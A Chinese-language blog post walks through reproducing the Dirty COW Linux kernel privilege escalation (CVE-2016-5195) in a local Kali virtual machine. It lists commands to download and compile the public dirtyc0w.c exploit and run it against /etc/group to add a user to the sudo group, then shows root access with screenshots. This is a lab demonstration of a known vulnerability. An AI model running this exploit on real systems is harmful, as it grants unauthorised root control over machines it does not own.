---
title: Dirty_cow
date: 2016-10-23 21:00:19
tags: kali
categories: kali
---
<img class="size-full wp-image-1867 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/FNFIL7WEIEL68@4KGY.png" alt="fnfil7weiel684kgy" width="437" height="53" />
<!--more-->
<h2>                                   （Dirty COW）</h2>
本地搭建实验环境：

本地 虚拟机：kali linux 2.0（内核4.6）

 <h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink" ></a></h1><hr>

<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/cow.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
 

&nbsp;
<pre class="lang:vim decode:true">1. service ssh start
2. ssh 用户名@localhost</pre>
1和2 开启ssh通道 ，不会开启linux 的ssh 请自行百度
<pre class="lang:vim decode:true">3. wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c</pre>
下载 exp
<pre class="lang:vim decode:true ">4  gcc -pthread dirtyc0w.c -o dirtyc0w</pre>
编译生成  <code class="">dirtyc0w.c</code>
<pre class="lang:vim decode:true">5 ./dirtyc0w /etc/group "$(sed '/\(sudo*\)/ s/$/,用户名/' /etc/group)"</pre>
执行 提权代码
<pre class="lang:vim decode:true ">6. exit</pre>
退出当前用户
<pre class="lang:vim decode:true ">7. sudo  su</pre>
提权超级用户权限
<pre class="lang:vim decode:true ">8. cat /etc/group |grep sudo</pre>
使用这命令参数来查看这个group下的 sudo的用户权限  ，我们可以对比下提权前和提权后的用户权限

<img class="size-full wp-image-1861 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/NWH@2N3I2D2C@@2RF8F7.png" alt="nwh2n3i2d2c2rf8f7" width="469" height="50" /> <img class="size-full wp-image-1862 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/828Y2_EQKH74YDSI.png" alt="828y2_eqkh74ydsi" width="472" height="150" />

最后发现 demon这个用户已经是管理员的权限了

（对比用户的权限）

<img class="size-full wp-image-1863 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/KP42VT9WGGWUS_R65.png" alt="kp42vt9wggwus_r65" width="489" height="232" /> <img class="size-full wp-image-1864 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/Z3FYKSFKOF62ZSKP@F.png" alt="z3fyksfkof62zskpf" width="509" height="367" />

提权后的用户权限：

<img class="size-full wp-image-1865 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/7UBPRU7WNUHF3_RW65L9.png" alt="7ubpru7wnuhf3_rw65l9" width="362" height="24" />

提权之前 和提权之后的权限对比：

<img class="size-full wp-image-1866 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/4G@GQWFLIJO_XSRKX83I5.png" alt="4ggqwflijo_xsrkx83i5" width="389" height="45" /><img class="size-full wp-image-1867 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/FNFIL7WEIEL68@4KGY.png" alt="fnfil7weiel684kgy" width="437" height="53" />

并附上黑手kali  也同样：

<img class="size-full wp-image-1868 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/10/20161024_224010-624x1081.png" alt="20161024_224010-624x1081" width="624" height="1081" />

&nbsp;

参考资料：<a href="http://www.secist.com/archives/1489.html">http://www.secist.com/archives/1489.html</a>   【漏洞预警】CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 13:41更新）

以上视频都是在Eternal群主发出这些文章不久后录制的，就想着手工验证一下，录制比较随意，大伙就凑合着看吧.本人菜鸟，若是哪里不妥，及时在即刻群@我，我一定及时更正完善该文章，谢谢！

&nbsp;

demon                  2016.10.31 更